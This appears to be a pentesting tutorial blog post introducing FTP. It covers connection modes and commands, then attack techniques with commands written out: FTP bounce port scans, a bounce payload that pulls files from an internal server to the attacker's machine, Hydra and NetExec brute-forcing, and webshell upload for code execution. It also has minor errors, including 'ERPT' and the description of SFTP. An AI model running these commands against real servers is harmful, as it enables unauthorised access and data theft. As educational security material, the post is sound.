@@ -1,0 +1,826 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://atlansec.es/blog/posts/14-11-2024/">
+      
+      
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.4">
+    
+    
+      
+        <title>Intro to FTP - Atlansec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Intro to FTP - Atlansec" >
+      
+        <meta  property="og:description"  content="None" >
+      
+        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/blog/posts/14-11-2024.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://atlansec.es/blog/posts/14-11-2024/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Intro to FTP - Atlansec" >
+      
+        <meta  name="twitter:description"  content="None" >
+      
+        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/blog/posts/14-11-2024.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#theory" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      <!--
+  Copyright (c) 2016-2024 Martin Donath <martin.donath@squidfunk.com>
+
+  Permission is hereby granted, free of charge, to any person obtaining a copy
+  of this software and associated documentation files (the "Software"), to
+  deal in the Software without restriction, including without limitation the
+  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+  sell copies of the Software, and to permit persons to whom the Software is
+  furnished to do so, subject to the following conditions:
+
+  The above copyright notice and this permission notice shall be included in
+  all copies or substantial portions of the Software.
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
+  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+  IN THE SOFTWARE.
+-->
+
+<!-- Determine classes -->
+ 
+
+<style>
+  .md-header {
+    box-shadow: none;
+  }
+
+  .md-post__back {
+    border-bottom: none !important;
+  }
+</style>
+
+<!-- Header -->
+<header class="md-header" data-md-component="header" style="width: 100%">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <!-- Button to open drawer -->
+    <label class="md-header__button md-icon" for="__drawer">
+       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+
+    <!-- Link to home -->
+    <a
+      href="../../.."
+      title="Atlansec"
+      class="md-header__button md-logo"
+      aria-label="Atlansec"
+      data-md-component="logo"
+    >
+      
+  <img src="../../../../assets/images/logo.png" alt="logo">
+
+    </a>
+
+    <!-- Color palette toggle -->
+      
+
+    <!-- User preference: color palette -->
+    
+
+    <!-- Site language selector -->
+     <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Select language">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="./" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../../es/blog/posts/14-11-2024/" hreflang="es" class="md-select__link">
+              Spanish
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>  
+    <style>
+      .md-header__inner,
+      .md-grid {
+        justify-content: space-between;
+      }
+      @media screen and (max-width: 1219px) {
+        .md-search {
+          position: absolute;
+          right: 0;
+        }
+      }
+    </style>
+    <!-- Button to open search modal -->
+    
+    <label class="md-header__button md-icon" for="__search">
+       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+    </label>
+
+    <!-- Search interface -->
+    <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div> 
+
+    <!-- Repository information -->
+     
+  </nav>
+
+  <!-- Navigation tabs (sticky) -->
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../services/" class="md-tabs__link">
+        
+  
+    
+  
+  Services
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../" class="md-tabs__link">
+        
+  
+    
+  
+  Blog
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Atlansec" class="md-nav__button md-logo" aria-label="Atlansec" data-md-component="logo">
+      
+  <img src="../../../../assets/images/logo.png" alt="logo">
+
+    </a>
+    Atlansec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#theory" class="md-nav__link">
+    <span class="md-ellipsis">
+      Theory
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Theory">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#communication-channels" class="md-nav__link">
+    <span class="md-ellipsis">
+      Communication channels
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connection-modes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connection modes
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Connection modes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#active" class="md-nav__link">
+    <span class="md-ellipsis">
+      Active
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#passive" class="md-nav__link">
+    <span class="md-ellipsis">
+      Passive
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP commands
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#anonymous-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anonymous login
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-bounce-port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Bounce port scan
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FTP Bounce port scan">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hand-made" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hand-made
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-bounce-file-get" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Bounce file get
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#brute-force-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Brute force attack
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Brute force attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      NetExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hydra" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hydra
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-content-backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full content backup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-file-upload-to-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP file upload to RCE
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sniffing-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sniffing credentials
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">Cybersecurity</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">FTP</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Pentesting</span>
+      
+    
+  </nav>
+
+
+
+  <h1>Intro to FTP</h1>
+
+<p>FTP (File Transfer Protocol) is one of the <strong>oldest and most widely</strong> used protocols for <strong>transferring files</strong> between computers. While it provides a simple way to move data, its default configuration lacks security, making it a common target for attackers. In this article, we’ll cover the basics of FTP, its <strong>communication modes</strong>, <strong>essential commands</strong>, and <strong>common misconfigurations</strong> that could be exploited. Whether you're a cybersecurity enthusiast or a penetration tester, understanding FTP is crucial for securing or assessing network environments.</p>
+<!-- more -->
+
+<p>This protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, <strong>the information is transmitted in plain text</strong>, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p>
+<p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>
+<h2 id="theory">Theory</h2>
+<h3 id="communication-channels">Communication channels</h3>
+<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>
+<h3 id="connection-modes">Connection modes</h3>
+<h4 id="active">Active</h4>
+<p>This is the default connection mode for FTP connections, in which two events occur:</p>
+<ul>
+<li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li>
+<li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>
+</div>
+<h4 id="passive">Passive</h4>
+<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p>
+<ul>
+<li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li>
+<li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>
+</div>
+<h2 id="ftp-commands">FTP commands</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>CWD<span class="w"> </span>-&gt;<span class="w"> </span>Changes<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>one
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>DELE<span class="w"> </span>-&gt;<span class="w"> </span>Deletes<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>file
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>EPRT<span class="w"> </span>-&gt;<span class="w"> </span>Establish<span class="w"> </span>a<span class="w"> </span>socket<span class="w"> </span><span class="k">for</span><span class="w"> </span>data<span class="w"> </span>connection
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>LIST<span class="w"> </span>-&gt;<span class="w"> </span>List<span class="w"> </span>the<span class="w"> </span>files<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PASV<span class="w"> </span>-&gt;<span class="w"> </span>Change<span class="w"> </span>mode<span class="w"> </span>to<span class="w"> </span>passive<span class="w"> </span>mode
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PWD<span class="w"> </span>-&gt;<span class="w"> </span>Displays<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>directory<span class="w"> </span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>RETR<span class="w"> </span>-&gt;<span class="w"> </span>Download<span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>file
+</span></code></pre></div>
+<h2 id="anonymous-login">Anonymous login</h2>
+<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>
+<h2 id="ftp-bounce-port-scan">FTP Bounce port scan</h2>
+<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-b<span class="w"> </span>&lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt;<span class="w"> </span>&lt;victim&gt;
+</span></code></pre></div>
+<h3 id="hand-made">Hand-made</h3>
+<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p>
+<p>Here is an example for scanning port 9091 on host 10.10.10.14</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>PORT<span class="w"> </span><span class="m">10</span>.10.10.14.14.0.9091
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>EPRT<span class="w"> </span><span class="p">|</span><span class="m">2</span><span class="p">|</span><span class="m">10</span>.10.10.14<span class="p">|</span><span class="m">9091</span><span class="o">||</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>LIST
+</span></code></pre></div>
+<p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>
+<h2 id="ftp-bounce-file-get">FTP Bounce file get</h2>
+<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p>
+<figure>
+    <img alt="Net Diagram" src="../../../assets/posts/2024/11/14/net_diagram.png" />
+  <figcaption>Net Diagram</figcaption>
+</figure>
+<p>This attack has the following prerequisites:</p>
+<ul>
+<li>Valid credentials for External FTP.</li>
+<li>Valid credentials for Internal FTP.</li>
+<li>Write access for External FTP.</li>
+<li>PORT command execution permissions on both External and Internal.</li>
+</ul>
+<p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p>
+<p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p>
+<p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>user<span class="w"> </span>ftp<span class="w"> </span><span class="c1"># User for the internal server</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>pass<span class="w"> </span>password<span class="w"> </span><span class="c1"># Password for the internal server</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>cwd<span class="w"> </span>/DIRECTORY
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nb">type</span><span class="w"> </span>i
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>port<span class="w"> </span>F,F,F,F,F,F,X,X<span class="w"> </span><span class="c1">#Our passive port</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>retr<span class="w"> </span>file.ext
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>quit
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@<span class="w"> </span>...<span class="w"> </span>^@^@^@^@
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@<span class="w"> </span>...<span class="w"> </span>^@^@^@^@
+</span></code></pre></div>
+<p>Now we upload it with PUT and from the external server we execute the following commands:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>put<span class="w"> </span>payload
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>quote<span class="w"> </span><span class="s2">&quot;port C,C,C,C,C,0,21&quot;</span><span class="w"> </span><span class="c1"># IP of internal server</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>quote<span class="w"> </span><span class="s2">&quot;retr payload&quot;</span>
+</span></code></pre></div>
+<p>After this we will have the file.ext file on our server as output.ext</p>
+<h2 id="brute-force-attack">Brute force attack</h2>
+<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>
+<h3 id="netexec">NetExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>ftp<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span>userfile<span class="w"> </span>-p<span class="w"> </span>passwordfile
+</span></code></pre></div>
+<h3 id="hydra">Hydra</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>userfile<span class="w"> </span>-P<span class="w"> </span>passwordfile<span class="w"> </span>ftp://IP
+</span></code></pre></div>
+<h2 id="full-content-backup">Full content backup</h2>
+<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>wget<span class="w"> </span>-r<span class="w"> </span>ftp://IP/dir/*<span class="w"> </span>--ftp-user<span class="o">=</span>username<span class="w"> </span>--ftp-password<span class="o">=</span>password
+</span></code></pre></div>
+<h2 id="ftp-file-upload-to-rce">FTP file upload to RCE</h2>
+<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p>
+<p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>
+<h2 id="sniffing-credentials">Sniffing credentials</h2>
+<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p>
+<p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>
+<p>Stay safe. Stay smart. Stay secure.</p>
+<hr />
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <style>
+    .footer-bottom {
+        padding-top: 1rem;
+        padding-bottom: 1rem;
+        text-align: center;
+        font-size: 0.875rem;
+        @media screen and (max-width: 991px) {
+        font-size: 2vw;
+            
+        }
+    }
+</style>
+
+
+<footer class="md-footer">
+    <div class="footer-bottom">
+        <p>&copy; 2025 Atlansec. All rights reserved.</p>
+    </div>
+    </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["hide_title", "navigation.indexes", "navigation.tabs", "content.code.copy", "i18n", "search.share"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+    
+  </body>
+</html>
